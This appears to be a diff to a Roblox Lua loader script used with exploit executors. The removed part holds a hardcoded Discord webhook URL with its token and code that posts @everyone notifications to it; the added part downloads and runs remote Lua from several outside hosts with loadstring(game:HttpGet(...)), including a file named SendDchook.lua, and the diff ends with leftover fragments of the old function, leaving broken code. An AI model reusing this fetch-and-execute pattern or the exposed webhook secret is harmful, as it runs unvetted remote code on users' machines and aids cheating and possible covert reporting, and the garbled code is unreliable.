@@ -1,40 +1,19 @@
--- Your Discord webhook URL
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1245689645304512514/UFA-6zMf9yQhSNKMjaoGr4SSED1EdnBczPwf5LFGx3ZQdVSbyFO8TmEcWzRIfSETIG6I"
+-- Step 1: Run webhook sender first
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua"))()
+end)
 
--- Delay before scripts start (change this number only)
-local DELAY = 10
+-- Step 2: Wait before loading others
+wait(8)
 
--- Function to send an embed to Discord
-local function sendEmbed(title, description, color)
-    local data = {
-        content = "@everyone", -- Pings everyone
-        embeds = {{
-            title = title,
-            description = description,
-            color = color,
-            footer = { text = "Loader Notification" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
+-- Step 3: Load other scripts with error handling
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua"))()
+end)
 
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    local request = request or http_request or syn.request or http.request
-    if request then
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    else
-        warn("No HTTP request function available in this environment.")
-    end
-end
-
--- Safe loader function
-local function safeLoad(url)
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet(url))()
+pcall(function()
+    loadstring(game:HttpGet("https://lunor.dev/loader"))()
+end)        return loadstring(game:HttpGet(url))()
     end)
     if not success then
         warn("Failed to load script from:", url, "\nError:", result)
